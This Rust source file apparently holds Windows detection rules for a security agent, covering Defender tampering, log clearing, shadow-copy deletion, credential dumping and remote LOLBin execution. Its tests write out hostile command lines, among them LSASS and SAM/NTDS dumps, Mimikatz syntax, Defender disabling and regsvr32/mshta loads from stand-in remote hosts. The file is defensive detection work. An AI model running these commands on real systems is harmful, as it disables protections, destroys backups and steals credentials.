//! Windows defense-evasion, credential-access and execution rules that
//! complement [`super::windows_rules`]: the same tools reached through
//! wrappers (`cmd /c powershell ...`), registry-level Defender tampering,
//! log/audit disabling, NTDS and SAM extraction forms, and remote-argument
//! LOLBins.
//!
//! Like `windows_rules` this is platform-neutral (replayable in CI) and only
//! matches Windows image names. Every rule requires a specific indicator, not
//! just the tool: `reg add` alone, `rundll32` alone or `ntdsutil` alone never
//! fire. Rules that admins can legitimately trigger start in shadow mode (see
//! the catalog).
//!
//! The caller passes the findings `windows_rules` already produced so a rule
//! id is never reported twice for one process start.

use super::ioa::ProcContext;
use crate::schema::DetectionData;

fn base(path: &str) -> String {
    path.rsplit(['\\', '/'])
        .next()
        .unwrap_or(path)
        .to_ascii_lowercase()
}

#[allow(clippy::too_many_arguments)]
fn finding(
    rule_id: &str,
    title: &str,
    category: &str,
    tactic: &str,
    technique: &str,
    confidence: u8,
    exe: &str,
    cmdline: &str,
) -> DetectionData {
    DetectionData {
        rule_id: rule_id.into(),
        title: title.into(),
        category: category.into(),
        mitre_tactic: Some(tactic.into()),
        mitre_technique: Some(technique.into()),
        confidence,
        subject: exe.to_string(),
        detail: format!("{title}: {cmdline}"),
        evidence: serde_json::json!({ "cmdline": cmdline }),
        ..Default::default()
    }
}

const EVASION: &str = "TA0005 Defense Evasion";
const CREDS: &str = "TA0006 Credential Access";
const EXEC: &str = "TA0002 Execution";
const IMPACT: &str = "TA0040 Impact";

/// Images that carry a command line for another tool.
const WRAPPERS: &[&str] = &[
    "cmd.exe",
    "powershell.exe",
    "pwsh.exe",
    "powershell_ise.exe",
];
const POWERSHELLS: &[&str] = &["powershell.exe", "pwsh.exe", "powershell_ise.exe"];
const OFFICE: &[&str] = &[
    "winword.exe",
    "excel.exe",
    "powerpnt.exe",
    "outlook.exe",
    "msaccess.exe",
    "mspub.exe",
    "visio.exe",
    "onenote.exe",
];
/// Tools Office has no business starting that the base rule's script-host
/// list does not cover.
const OFFICE_EXTRA_CHILDREN: &[&str] = &[
    "wmic.exe",
    "schtasks.exe",
    "curl.exe",
    "installutil.exe",
    "regasm.exe",
    "regsvcs.exe",
    "forfiles.exe",
    "pcalua.exe",
];

/// A UNC path to a remote host, or a WebDAV path. `\\.\` and `\\?\` are
/// local device namespaces, not remote shares.
fn remote_path(lower: &str) -> bool {
    lower.contains("davwwwroot")
        || lower.match_indices("\\\\").any(|(i, _)| {
            let rest = &lower[i + 2..];
            // A path continuation (`c:\a\\b`) has a character before the
            // pair that is part of the path, a UNC starts a token.
            let starts_token = i == 0
                || lower[..i].chars().next_back().is_some_and(|c| {
                    c.is_whitespace() || matches!(c, '"' | '\'' | ',' | ':' | '=')
                });
            starts_token
                && !rest.starts_with('.')
                && !rest.starts_with('?')
                && rest
                    .chars()
                    .next()
                    .is_some_and(|c| c.is_ascii_alphanumeric())
                && rest.contains('\\')
        })
}

fn encoded_command(lower: &str) -> bool {
    let words: Vec<&str> = lower.split_whitespace().collect();
    words.windows(2).any(|w| {
        let flag = w[0].trim_start_matches(['-', '/']);
        let is_enc = flag == "ec" || (!flag.is_empty() && "encodedcommand".starts_with(flag));
        is_enc
            && w[1].len() >= 20
            && w[1]
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=')
    })
}

/// Defender switches that turn protection off when set to 1 / `$true`.
const DEFENDER_DISABLE: &[&str] = &[
    "disableantispyware",
    "disableantivirus",
    "disablerealtimemonitoring",
    "disablebehaviormonitoring",
    "disableioavprotection",
    "disableonaccessprotection",
    "disablescriptscanning",
    "disableblockatfirstseen",
];

fn on_value(lower: &str, key: &str) -> bool {
    // `-DisableX 1`, `-DisableX $true`, `/v DisableX ... /d 1`, `DisableX -Value 1`.
    lower.match_indices(key).any(|(i, _)| {
        let tail = &lower[i + key.len()..];
        let w: Vec<&str> = tail
            .split_whitespace()
            .take(6)
            .map(|s| s.trim_matches(|c| c == '"' || c == '\'' || c == ';' || c == ')'))
            .collect();
        w.iter().enumerate().any(|(n, t)| {
            matches!(*t, "1" | "$true" | "0x1" | "true")
                && (n == 0
                    || w[..n].iter().any(|p| {
                        matches!(
                            *p,
                            "/d" | "-value"
                                | "-propertyvalue"
                                | "-force"
                                | "/f"
                                | "/t"
                                | "reg_dword"
                                | "-type"
                                | "dword"
                        )
                    }))
        })
    })
}

fn defender_tamper(image: &str, lower: &str) -> bool {
    let mp = lower.contains("set-mppreference") || lower.contains("add-mppreference");
    let reg_tool = (image == "reg.exe" && lower.contains(" add "))
        || lower.contains("reg add")
        || lower.contains("reg.exe add");
    let ps_reg = lower.contains("set-itemproperty") || lower.contains("new-itemproperty");
    let defender_key = lower.contains("windows defender");
    (mp && DEFENDER_DISABLE.iter().any(|k| on_value(lower, k)))
        || (mp && lower.contains("add-mppreference") && lower.contains("-exclusion"))
        || ((reg_tool || ps_reg)
            && defender_key
            && (DEFENDER_DISABLE.iter().any(|k| on_value(lower, k))
                || lower.contains("\\exclusions\\")
                || (lower.contains("tamperprotection")
                    && (lower.contains("/d 0") || lower.contains("-value 0")))))
        || (image == "mpcmdrun.exe"
            && lower.contains("removedefinitions")
            && lower.contains("-all"))
        || (matches!(image, "net.exe" | "net1.exe" | "cmd.exe")
            && lower.contains(" stop ")
            && (lower.contains("windefend") || lower.contains("\"windows defender")))
        || (matches!(image, "sc.exe" | "cmd.exe")
            && (lower.contains(" stop ") || lower.contains(" config "))
            && (lower.contains("wdnissvc")
                || lower.contains("wdfilter")
                || lower.contains(" sense")
                || lower.contains("wdboot")))
}

fn lsass_dump_text(lower: &str) -> bool {
    (lower.contains("comsvcs") && lower.contains("minidump"))
        || (lower.contains("procdump") && lower.contains("lsass"))
        || (lower.contains("minidumpwritedump") && lower.contains("lsass"))
        || (lower.contains("out-minidump") && lower.contains("lsass"))
}

fn hive_export_text(lower: &str) -> bool {
    let reg_save = (lower.contains("reg save") || lower.contains("reg.exe save"))
        && [
            "hklm\\sam",
            "hklm\\security",
            "hkey_local_machine\\sam",
            "hkey_local_machine\\security",
        ]
        .iter()
        .any(|h| lower.contains(h));
    // Hives or NTDS read from a volume shadow copy.
    let from_shadow = lower.contains("harddiskvolumeshadowcopy")
        && (lower.contains("\\config\\sam")
            || lower.contains("\\config\\security")
            || lower.contains("ntds.dit"));
    let esentutl = lower.contains("esentutl") && lower.contains("/y") && lower.contains("ntds.dit");
    reg_save || from_shadow || esentutl
}

fn shadow_delete_text(lower: &str) -> bool {
    (lower.contains("vssadmin")
        && (lower.contains("delete shadows") || lower.contains("resize shadowstorage")))
        || (lower.contains("diskshadow") && lower.contains("delete shadows"))
        || (lower.contains("win32_shadowcopy")
            && (lower.contains("delete")
                || lower.contains("remove-wmiobject")
                || lower.contains("remove-ciminstance")))
        || (lower.contains("wmic") && lower.contains("shadowcopy") && lower.contains("delete"))
}

/// Additional rules for one Windows process start. `already` holds the
/// findings `windows_rules::inspect_process` returned for the same start;
/// rule ids in it are not repeated.
pub fn inspect_additional(
    name: &str,
    exe: &str,
    cmdline: &str,
    ctx: Option<&ProcContext>,
    already: &[DetectionData],
) -> Vec<DetectionData> {
    let image = {
        let b = base(exe);
        if b.is_empty() {
            base(name)
        } else {
            b
        }
    };
    if !image.ends_with(".exe") {
        return Vec::new();
    }
    let lower = cmdline.to_ascii_lowercase();
    let wrapper = WRAPPERS.contains(&image.as_str());
    let has = |needles: &[&str]| needles.iter().any(|n| lower.contains(n));
    let http = has(&["http://", "https://", "ftp://"]);
    let mut out: Vec<DetectionData> = Vec::new();
    let mut push = |f: DetectionData| {
        if !already.iter().any(|a| a.rule_id == f.rule_id)
            && !out.iter().any(|o| o.rule_id == f.rule_id)
        {
            out.push(f);
        }
    };

    // ── Defense evasion ──────────────────────────────────────────────────
    if defender_tamper(&image, &lower) {
        push(finding(
            "defense_evasion.defender_tamper",
            "Microsoft Defender protection disabled or excluded",
            "defense_evasion",
            EVASION,
            "T1562.001",
            80,
            exe,
            cmdline,
        ));
    }
    if (wrapper
        && has(&["wevtutil"])
        && lower
            .split_whitespace()
            .any(|w| w == "cl" || w == "clear-log"))
        || (wrapper && has(&["clear-eventlog", "remove-eventlog"]))
    {
        push(finding(
            "defense_evasion.eventlog_clear",
            "Windows event log cleared",
            "defense_evasion",
            EVASION,
            "T1070.001",
            85,
            exe,
            cmdline,
        ));
    }
    // Disabling a log channel stops evidence being written at all.
    if (image == "wevtutil.exe" || wrapper)
        && has(&["wevtutil"])
        && lower
            .split_whitespace()
            .any(|w| w == "sl" || w == "set-log")
        && (lower.contains("/e:false") || lower.contains("/enabled:false"))
    {
        push(finding(
            "defense_evasion.eventlog_disabled",
            "Windows event log channel disabled",
            "defense_evasion",
            EVASION,
            "T1562.002",
            80,
            exe,
            cmdline,
        ));
    }
    if (image == "auditpol.exe" || wrapper)
        && has(&["auditpol"])
        && (has(&["/clear", "/remove /allusers"])
            || (has(&["/set"])
                && has(&["/success:disable", "/failure:disable"])
                && has(&["/subcategory", "/category"])))
    {
        push(finding(
            "defense_evasion.audit_policy_disabled",
            "Audit policy cleared or disabled",
            "defense_evasion",
            EVASION,
            "T1562.002",
            80,
            exe,
            cmdline,
        ));
    }
    if wrapper
        && has(&["bcdedit"])
        && has(&["recoveryenabled no", "bootstatuspolicy ignoreallfailures"])
    {
        push(finding(
            "impact.recovery_disabled",
            "Windows recovery disabled",
            "impact",
            IMPACT,
            "T1490",
            85,
            exe,
            cmdline,
        ));
    }
    if (image == "bcdedit.exe" || wrapper)
        && has(&["bcdedit"])
        && has(&[
            "safeboot minimal",
            "safeboot network",
            "testsigning on",
            "nointegritychecks on",
            "disable_integrity_checks",
        ])
    {
        push(finding(
            "defense_evasion.boot_config_tamper",
            "Boot configuration weakened (safe boot or driver signing)",
            "defense_evasion",
            EVASION,
            "T1562.009",
            70,
            exe,
            cmdline,
        ));
    }
    if (wrapper || image == "diskshadow.exe") && shadow_delete_text(&lower) {
        push(finding(
            "impact.shadow_copy_delete",
            "Volume shadow copies deleted",
            "impact",
            IMPACT,
            "T1490",
            90,
            exe,
            cmdline,
        ));
    }

    // ── Credential access ────────────────────────────────────────────────
    if (wrapper || image != "rundll32.exe" && image != "procdump.exe" && image != "procdump64.exe")
        && lsass_dump_text(&lower)
    {
        push(finding(
            "credential_access.lsass_dump",
            "LSASS memory dumped",
            "credential_access",
            CREDS,
            "T1003.001",
            95,
            exe,
            cmdline,
        ));
    }
    if (wrapper || image == "esentutl.exe" || image == "copy.exe" || image == "xcopy.exe")
        && hive_export_text(&lower)
    {
        push(finding(
            "credential_access.sam_hive_save",
            "SAM/SECURITY hive or NTDS database copied",
            "credential_access",
            CREDS,
            "T1003.002",
            90,
            exe,
            cmdline,
        ));
    }
    if (image == "ntdsutil.exe" || wrapper && has(&["ntdsutil"]))
        && has(&["ntds"])
        && has(&["ifm", "create full", "create sysvol full"])
    {
        push(finding(
            "credential_access.ntds_dump",
            "Active Directory database extracted with ntdsutil",
            "credential_access",
            CREDS,
            "T1003.003",
            85,
            exe,
            cmdline,
        ));
    }
    if has(&[
        "sekurlsa::",
        "lsadump::",
        "kerberos::golden",
        "invoke-mimikatz",
    ]) || (has(&["privilege::debug"]) && has(&["::"]))
    {
        push(finding(
            "credential_access.mimikatz",
            "Mimikatz command syntax in a command line",
            "credential_access",
            CREDS,
            "T1003.001",
            95,
            exe,
            cmdline,
        ));
    }

    // ── Execution ────────────────────────────────────────────────────────
    // Encoded PowerShell reached through a wrapper or another launcher.
    if !POWERSHELLS.contains(&image.as_str())
        && has(&["powershell", "pwsh"])
        && encoded_command(&lower)
    {
        push(finding(
            "execution.powershell_encoded",
            "PowerShell with encoded command",
            "execution",
            EXEC,
            "T1059.001",
            70,
            exe,
            cmdline,
        ));
    }
    // Remote-argument LOLBins not covered by the http-only base rules.
    let args = lower
        .split_once(".exe")
        .map(|(_, a)| a)
        .unwrap_or(lower.as_str());
    if image == "rundll32.exe" && (http || remote_path(args)) {
        push(finding(
            "lolbin.rundll32_remote",
            "rundll32 loads a DLL from a remote location",
            "lolbin",
            EVASION,
            "T1218.011",
            75,
            exe,
            cmdline,
        ));
    }
    if image == "mshta.exe" && remote_path(args) {
        push(finding(
            "lolbin.mshta_remote",
            "mshta executes remote or inline script",
            "lolbin",
            EVASION,
            "T1218.005",
            85,
            exe,
            cmdline,
        ));
    }
    if image == "regsvr32.exe"
        && ((has(&["/i:", "-i:"]) && has(&[".sct"]))
            || (has(&["/s", "-s"]) && remote_path(args))
            || remote_path(args) && has(&["/i:", "-i:"]))
    {
        push(finding(
            "lolbin.regsvr32_remote",
            "regsvr32 loads a remote scriptlet",
            "lolbin",
            EVASION,
            "T1218.010",
            90,
            exe,
            cmdline,
        ));
    }

    // Office starting tools the base lineage rule does not list.
    if let Some(ctx) = ctx {
        if OFFICE_EXTRA_CHILDREN.contains(&image.as_str()) {
            if let Some(office) = ctx
                .ancestor_comms
                .first()
                .map(|a| a.to_ascii_lowercase())
                .filter(|p| OFFICE.contains(&p.as_str()))
            {
                let mut f = finding(
                    "execution.office_child_shell",
                    "Office application started a script host",
                    "execution",
                    EXEC,
                    "T1204.002",
                    80,
                    exe,
                    cmdline,
                );
                f.evidence["parent"] = serde_json::json!(office);
                push(f);
            }
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn run(name: &str, cmd: &str) -> Vec<String> {
        let exe = format!("C:\\Windows\\System32\\{name}");
        inspect_additional(name, &exe, cmd, None, &[])
            .into_iter()
            .map(|d| d.rule_id)
            .collect()
    }

    #[test]
    fn evasion_forms_are_detected() {
        let cases = [
            ("reg.exe", "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f", "defense_evasion.defender_tamper"),
            ("reg.exe", "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" /v C:\\Users\\Public /t REG_DWORD /d 0 /f", "defense_evasion.defender_tamper"),
            ("powershell.exe", "powershell -c Set-MpPreference -DisableRealtimeMonitoring 1", "defense_evasion.defender_tamper"),
            ("cmd.exe", "cmd /c powershell Add-MpPreference -ExclusionPath C:\\Temp", "defense_evasion.defender_tamper"),
            ("MpCmdRun.exe", "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All", "defense_evasion.defender_tamper"),
            ("net.exe", "net stop WinDefend", "defense_evasion.defender_tamper"),
            ("cmd.exe", "cmd /c wevtutil cl Security", "defense_evasion.eventlog_clear"),
            ("powershell.exe", "powershell wevtutil cl System", "defense_evasion.eventlog_clear"),
            ("wevtutil.exe", "wevtutil sl Microsoft-Windows-Sysmon/Operational /e:false", "defense_evasion.eventlog_disabled"),
            ("auditpol.exe", "auditpol /clear /y", "defense_evasion.audit_policy_disabled"),
            ("auditpol.exe", "auditpol /set /subcategory:\"Process Creation\" /success:disable", "defense_evasion.audit_policy_disabled"),
            ("cmd.exe", "cmd /c vssadmin delete shadows /all /quiet", "impact.shadow_copy_delete"),
            ("diskshadow.exe", "diskshadow /s c:\\t\\x.txt delete shadows all", "impact.shadow_copy_delete"),
            ("powershell.exe", "powershell Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }", "impact.shadow_copy_delete"),
            ("cmd.exe", "cmd /c bcdedit /set {default} recoveryenabled No", "impact.recovery_disabled"),
            ("bcdedit.exe", "bcdedit /set {default} safeboot minimal", "defense_evasion.boot_config_tamper"),
            ("powershell.exe", "powershell rundll32 C:\\Windows\\System32\\comsvcs.dll MiniDump (Get-Process lsass).Id C:\\t\\l.dmp full", "credential_access.lsass_dump"),
            ("cmd.exe", "cmd /c procdump -ma lsass.exe C:\\t\\l.dmp", "credential_access.lsass_dump"),
            ("cmd.exe", "cmd /c reg save HKLM\\SAM C:\\t\\sam.save", "credential_access.sam_hive_save"),
            ("cmd.exe", "cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\t\\", "credential_access.sam_hive_save"),
            ("esentutl.exe", "esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\t\\ntds.dit", "credential_access.sam_hive_save"),
            ("ntdsutil.exe", "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\t\" q q", "credential_access.ntds_dump"),
            ("cmd.exe", "cmd /c mimikatz.exe privilege::debug sekurlsa::logonpasswords exit", "credential_access.mimikatz"),
            ("cmd.exe", "cmd /c powershell -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", "execution.powershell_encoded"),
            ("rundll32.exe", "rundll32.exe \\\\203.0.113.5\\share\\evil.dll,Start", "lolbin.rundll32_remote"),
            ("rundll32.exe", "rundll32 \\\\evil@80\\DavWWWRoot\\x.dll,Run", "lolbin.rundll32_remote"),
            ("mshta.exe", "mshta \\\\203.0.113.5\\share\\a.hta", "lolbin.mshta_remote"),
            ("regsvr32.exe", "regsvr32 /s /n /u /i:C:\\Users\\a\\x.sct", "lolbin.regsvr32_remote"),
            ("regsvr32.exe", "regsvr32 /s /i:\\\\evil\\s\\x.sct", "lolbin.regsvr32_remote"),
        ];
        for (name, cmd, rule) in cases {
            assert!(
                run(name, cmd).contains(&rule.to_string()),
                "{rule} missed for: {cmd}"
            );
        }
    }

    #[test]
    fn benign_admin_forms_are_not_detected() {
        for (name, cmd) in [
            ("reg.exe", "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 0 /f"),
            ("reg.exe", "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\""),
            ("reg.exe", "reg add HKCU\\Software\\App /v DisableRealtimeMonitoring /d 1"),
            ("powershell.exe", "powershell Set-MpPreference -DisableRealtimeMonitoring 0"),
            ("powershell.exe", "powershell Get-MpPreference"),
            ("MpCmdRun.exe", "MpCmdRun.exe -SignatureUpdate"),
            ("net.exe", "net stop Spooler"),
            ("cmd.exe", "cmd /c wevtutil qe Security /c:5"),
            ("wevtutil.exe", "wevtutil sl Security /ms:1073741824"),
            ("auditpol.exe", "auditpol /get /category:*"),
            ("cmd.exe", "cmd /c vssadmin list shadows"),
            ("diskshadow.exe", "diskshadow /s backup.txt"),
            ("cmd.exe", "cmd /c bcdedit /enum"),
            ("bcdedit.exe", "bcdedit /set {current} description Windows"),
            ("cmd.exe", "cmd /c procdump -ma myapp.exe C:\\t\\a.dmp"),
            ("cmd.exe", "cmd /c reg save HKLM\\SYSTEM C:\\backup\\system.hiv"),
            ("cmd.exe", "cmd /c reg save HKCU\\Software\\App C:\\t\\app.hiv"),
            ("ntdsutil.exe", "ntdsutil \"metadata cleanup\" q"),
            ("cmd.exe", "cmd /c powershell -ExecutionPolicy Bypass -File C:\\s\\a.ps1"),
            ("rundll32.exe", "rundll32.exe C:\\Windows\\System32\\shell32.dll,Control_RunDLL desk.cpl"),
            ("rundll32.exe", "rundll32.exe printui.dll,PrintUIEntry /in /n\\\\printsrv\\hp"),
            ("mshta.exe", "mshta.exe C:\\Program Files\\App\\setup.hta"),
            ("regsvr32.exe", "regsvr32 /s C:\\Program Files\\App\\x.dll"),
        ] {
            assert!(run(name, cmd).is_empty(), "false positive {:?} for {cmd}", run(name, cmd));
        }
    }

    #[test]
    fn does_not_repeat_findings_the_base_rules_made() {
        let exe = "C:\\Windows\\System32\\cmd.exe";
        let first = inspect_additional("cmd.exe", exe, "cmd /c vssadmin delete shadows", None, &[]);
        assert_eq!(first.len(), 1);
        assert!(inspect_additional(
            "cmd.exe",
            exe,
            "cmd /c vssadmin delete shadows",
            None,
            &first
        )
        .is_empty());
    }

    #[test]
    fn office_extra_children_need_an_office_parent() {
        let ctx = |p: &str| ProcContext {
            ancestor_comms: vec![p.to_string(), "explorer.exe".to_string()],
            ..Default::default()
        };
        let exe = "C:\\Windows\\System32\\wbem\\WMIC.exe";
        let hit = inspect_additional(
            "WMIC.exe",
            exe,
            "wmic process list",
            Some(&ctx("EXCEL.EXE")),
            &[],
        );
        assert_eq!(hit[0].rule_id, "execution.office_child_shell");
        assert!(inspect_additional(
            "WMIC.exe",
            exe,
            "wmic process list",
            Some(&ctx("explorer.exe")),
            &[]
        )
        .is_empty());
    }

    #[test]
    fn every_rule_maps_to_a_mitre_technique() {
        let exe = "C:\\Windows\\System32\\cmd.exe";
        let d = inspect_additional(
            "cmd.exe",
            exe,
            "cmd /c mimikatz sekurlsa::logonpasswords",
            None,
            &[],
        );
        for f in d {
            assert!(f
                .mitre_technique
                .as_deref()
                .is_some_and(|t| t.starts_with('T')));
            assert!(f
                .mitre_tactic
                .as_deref()
                .is_some_and(|t| t.starts_with("TA")));
        }
    }

    #[test]
    fn linux_processes_never_match() {
        assert!(
            inspect_additional("bash", "/usr/bin/bash", "wevtutil cl Security", None, &[])
                .is_empty()
        );
    }
}
